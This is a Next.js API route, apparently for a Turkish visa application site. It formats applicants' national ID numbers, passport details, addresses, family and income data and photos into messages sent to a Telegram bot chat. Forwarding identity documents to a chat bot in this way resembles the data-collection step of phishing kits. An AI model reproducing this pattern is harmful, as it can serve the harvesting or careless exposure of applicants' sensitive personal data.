import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { formData, accessCode } = body

    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!botToken || !chatId) {
      return NextResponse.json({ error: "Telegram configuration missing" }, { status: 500 })
    }

    // Format the message with all form data
    const message = `
🆕 *Yeni Vize Başvurusu*

📋 *Erişim Kodu:* \`${accessCode}\`

👤 *KİŞİSEL BİLGİLER*
• Ad Soyad: ${formData.fullName}
• Eski Soyadlar: ${formData.oldSurnames || "Yok"}
• Cinsiyet: ${formData.gender}
• Medeni Durum: ${formData.maritalStatus}
• Doğum Tarihi: ${formData.dateOfBirth}
• Doğum Yeri: ${formData.birthDistrict}/${formData.birthCity}
• TC Kimlik: ${formData.tcNumber}

📞 *İLETİŞİM BİLGİLERİ*
• Adres: ${formData.address}
• Telefon: ${formData.phone}
• E-posta: ${formData.email}

🛂 *PASAPORT BİLGİLERİ*
• Pasaport No: ${formData.passportNumber}
• Veren Makam: ${formData.issuingAuthority}
• Veriliş Tarihi: ${formData.issueDate}
• Son Kullanma: ${formData.expirationDate}

🇺🇸 *ABD GEÇMİŞİ*
• Daha Önce ABD'de Bulundu: ${formData.previouslyInUS}
• Vize Reddi: ${formData.visaRejection}
${formData.visaRejection === 'Evet' ? `• Red Sebebi: ${formData.visaRejectionReason}` : ''}

💼 *İŞ BİLGİLERİ*
• Meslek: ${formData.occupation}
• İşveren: ${formData.employer}
• İşveren Adresi: ${formData.employerAddress}
• Aylık Gelir: ${formData.monthlyIncome}
• İşe Başlama: ${formData.workStartDate}
• İş Tanımı: ${formData.jobDescription}

👪 *AİLE BİLGİLERİ*
• Baba: ${formData.fatherName} - ${formData.fatherBirthDate}
• Anne: ${formData.motherName} - ${formData.motherBirthDate}
• ABD'deki Akrabalar: ${formData.relativesInUS}
${formData.maritalStatus === 'Evli' ? `• Eş: ${formData.spouseName} - ${formData.spouseBirthDate} - ${formData.spouseBirthPlace} - ${formData.spouseNationality}` : ''}

🎓 *EĞİTİM VE DİL*
• Eğitim: ${formData.education}
• Yabancı Diller: ${formData.foreignLanguages}

🌍 *DİĞER BİLGİLER*
• Ziyaret Edilen Ülkeler: ${formData.visitedCountries}
• Askerlik: ${formData.militaryService}
• Ek Bilgiler: ${formData.additionalInfo || "Yok"}

📸 *FOTOĞRAF:* ${formData.photo ? 'Eklendi ✅' : 'Yok ❌'}

⏰ *Gönderim Zamanı:* ${new Date().toLocaleString("tr-TR")}
    `.trim()

    // Send message to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })
    
    // Send photo if exists
    if (formData.photo) {
      try {
        const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`
        await fetch(photoUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            photo: formData.photo,
            caption: `📸 ${formData.fullName} - Pasaport Fotoğrafı`,
          }),
        })
      } catch (photoError) {
        console.error('Photo send error:', photoError)
      }
    }

    if (!response.ok) {
      const errorData = await response.json()
      console.error("Telegram API error:", errorData)
      return NextResponse.json({ error: "Failed to send Telegram message" }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending Telegram message:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
